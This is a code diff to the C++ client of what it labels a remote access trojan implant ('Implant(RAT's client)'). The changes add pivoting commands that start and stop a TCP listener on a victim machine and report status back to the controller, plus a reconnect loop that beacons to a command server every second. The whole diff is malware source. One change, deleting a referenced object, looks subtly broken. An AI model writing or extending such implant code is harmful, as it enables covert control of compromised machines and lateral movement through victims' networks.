@@ -1,6 +1,7 @@
 /*
 Author: ISSAC
 
+Introduction: Implant(RAT's client).
 */
 
 #include <iostream>
@@ -13,6 +14,7 @@ Author: ISSAC
 #include <vector>
 #include <tuple>
 #include <thread>
+#include <chrono>
 
 #include <arpa/inet.h>
 
@@ -373,7 +375,11 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
     }
     else if (vsMsg[0] == "server") //Pivoting.
     {
-        if (vsMsg[1] == "start")
+        if (vsMsg[1] == "list")
+        {
+
+        }
+        else if (vsMsg[1] == "start")
         {
             int nPort = std::stoi(vsMsg[2]);
             STR szRSAPublicKey = vsMsg[3];
@@ -394,14 +400,43 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
             std::thread([]() {
                 g_ltpTcp->fnStart();
             }).detach();
-            clsTools::fnLogInfo("OK");
+
+            STRLIST ls = {
+                "server",
+                "start",
+                "1",
+                "",
+            };
+
+            victim.fnSendCommand(ls);
         }
         else if (vsMsg[1] == "stop")
         {
-            if (g_ltpTcp != nullptr && !g_ltpTcp->m_bListening)
+            if (g_ltpTcp != nullptr && g_ltpTcp->m_bListening)
             {
                 g_ltpTcp->fnStop();
                 delete g_ltpTcp;
+
+                STRLIST ls = {
+                    "server",
+                    "stop",
+                    "1",
+                    "",
+                };
+
+                victim.fnSendCommand(ls);
+            }
+            else
+            {
+                STRLIST ls = {
+                    "server",
+                    "stop",
+                    "0",
+                    "No any listening.",
+                };
+
+                victim.fnSendCommand(ls);
+
             }
         }
     }
@@ -612,6 +647,8 @@ void fnHttpHandler(int sktSrv)
 
     } while (nRecv > 0);
 
+    delete &victim;
+
     clsTools::fnLogErr("Session is terminated.");
 }
 
@@ -817,5 +854,7 @@ int main(int argc, char *argv[])
                 fnTcpConnect(g_szIP, g_nPort);
                 break;
         }
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
     }
 }
